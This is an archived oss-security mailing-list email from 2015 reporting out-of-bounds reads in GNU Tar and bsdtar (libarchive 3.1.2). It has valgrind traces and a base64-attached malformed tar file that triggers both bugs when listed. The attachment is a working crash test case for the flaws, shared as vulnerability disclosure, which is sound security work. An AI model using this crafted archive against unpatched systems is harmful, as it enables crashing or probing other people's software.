X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5968" "Monday" "31" "August" "2015" "08:20:11" "-0300" "Gustavo Grieco" "gustavo.grieco@gmail.com" "<CACn5sdQBUYfLa8JPTFXyQpooCRdWMQ2HRegp0B57wE5r3i5xKQ@mail.gmail.com>" "125" "[oss-security] Out of bounds read using malformed tar archive in GNU Tar and BSD Tar" nil nil nil "8" "2015083111:20:11" "[oss-security] Out of bounds read using malformed tar archive in GNU Tar and BSD Tar" (number mark "        gustavo.grie Aug 31  125/5968  " thread-indent "\"[oss-security] Out of bounds read using malformed tar archive in GNU Tar and BSD Tar\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 7179 invoked by uid 550); 31 Aug 2015 11:20:30 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 6099 invoked from network); 31 Aug 2015 11:20:22 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to:content-type;
        bh=zZoKjLVmuLPolXXx9vvAbqsoCbbMHmquErYgTJmY8XE=;
        b=UthMnJJGGlz+K2tRqSdGzDqfWVGjAAfF19Id9GrDfl+tejalW/AK1aAswnn2ynn/Ma
         w3L44/acO3q/dCpARBFgZ8xD0FuUZqvQvO8XyccV6s864sh0R6UPo1Gdc25PPU9GoO/N
         wkCW4kC9eLFcW0XULkpyOFQgy49Jn7lTidxIO+7P1KOC03uA2H1prOSWQc3iMmH7t6II
         IXWO9c6PDjqTdBgcFrCJysWGxMhkzc1baKVuy1Frj8Fxndnh1qGlnqPEaEPQ6uNEaKLm
         gE0zYwGiKgztWl4jo+azGBgsEsTwGA3VQTMq7lR9A0V2mvOGutqpZRC1YS/WxBrsTqxY
         r2zw==
MIME-Version: 1.0
X-Received: by 10.152.44.130 with SMTP id e2mr10233776lam.14.1441020011556;
 Mon, 31 Aug 2015 04:20:11 -0700 (PDT)
Message-ID: <CACn5sdQBUYfLa8JPTFXyQpooCRdWMQ2HRegp0B57wE5r3i5xKQ@mail.gmail.com>
Content-Type: multipart/mixed; boundary=089e0160bc46e7fdc3051e999d67
Date: Mon, 31 Aug 2015 08:20:11 -0300
From: Gustavo Grieco <gustavo.grieco@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Out of bounds read using malformed tar archive in GNU Tar and BSD Tar
To: oss-security@lists.openwall.com

--089e0160bc46e7fdc3051e999d67
Content-Type: text/plain; charset=UTF-8

Hello,

We found some out-of-bands reads in tar clients: GNU Tar and  BSD Tar
(libarchive 3.1.2). These vulnerabilities can be triggered performing
a list operation of the compressed files inside an archive. Find
attached a single test case that exposes both vulnerabilities. They
can be easily detected using valgrind:


$ valgrind bsdtar -tvf oob-access.tar

bsdtar: Failed to set default locale
==8307== Invalid read of size 4
==8307==    at 0x807AC4D: archive_read_format_tar_read_header
(archive_read_support_format_tar.c:506)
==8307==    by 0x805779D: _archive_read_next_header2 (archive_read.c:636)
==8307==    by 0x80578D1: _archive_read_next_header (archive_read.c:676)
==8307==    by 0x804C783: read_archive (read.c:235)
==8307==    by 0x804D1C5: tar_mode_t (read.c:86)
==8307==    by 0x804B591: main (bsdtar.c:798)
==8307==  Address 0x422ca94 is 4 bytes before a block of size 32 alloc'd
==8307==    at 0x402A17C: malloc (in
/usr/lib/valgrind/vgpreload_memcheck-x86-linux.so)
==8307==    by 0x402C3AF: realloc (in
/usr/lib/valgrind/vgpreload_memcheck-x86-linux.so)
==8307==    by 0x808006E: archive_string_ensure (archive_string.c:307)
==8307==    by 0x8082F76: archive_wstring_append_from_mbs (archive_string.c:259)
==8307==    by 0x8083876: archive_mstring_get_wcs (archive_string.c:3955)
==8307==    by 0x8050802: archive_entry_pathname_w (archive_entry.c:540)
==8307==    by 0x807A17B: tar_read_header
(archive_read_support_format_tar.c:1273)
==8307==    by 0x807AB87: archive_read_format_tar_read_header
(archive_read_support_format_tar.c:473)
==8307==    by 0x805779D: _archive_read_next_header2 (archive_read.c:636)
==8307==    by 0x80578D1: _archive_read_next_header (archive_read.c:676)
==8307==    by 0x804C783: read_archive (read.c:235)
==8307==    by 0x804D1C5: tar_mode_t (read.c:86)
==8307==
---------x  0 1      1           1 Jan  1  1970

$ valgrind tar -tvf oob-access.tar

tar: Substituting `.' for empty member name
==8598== Invalid read of size 1
==8598==    at 0x80614B9: simple_print_header (list.c:1142)
==8598==    by 0x80620CC: list_archive (list.c:287)
==8598==    by 0x8061F6F: read_and (list.c:199)
==8598==    by 0x804BD81: main (tar.c:2710)
==8598==  Address 0x4271857 is 1 bytes before a block of size 1 alloc'd
==8598==    at 0x402A17C: malloc (in
/usr/lib/valgrind/vgpreload_memcheck-x86-linux.so)
==8598==    by 0x808164F: xmalloc (xmalloc.c:43)
==8598==    by 0x808185F: xmemdup (xmalloc.c:115)
==8598==    by 0x808189E: xstrdup (xmalloc.c:123)
==8598==    by 0x8062274: assign_string (misc.c:43)
==8598==    by 0x8060AEC: read_header (list.c:530)
==8598==    by 0x8061BF5: read_and (list.c:154)
==8598==    by 0x804BD81: main (tar.c:2710)
==8598==
---------x 1/1               1 1970-01-01 00:00


Fortunately the last revisions of GNU Tar and libarchive fixed these
issues. Do we have CVE for these issues?

Regards,
Gustavo.

--089e0160bc46e7fdc3051e999d67
Content-Type: application/x-tar; name="oob-access.tar"
Content-Disposition: attachment; filename="oob-access.tar"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_idzu3zes0

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAADAwMDAwMDEAMDAwMDAwMQAwMDAwMDAxADAwMDAwMDAwMDAx
ADAwMDAwMDAwMDAxADAwNDUwNQAgMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=

--089e0160bc46e7fdc3051e999d67--
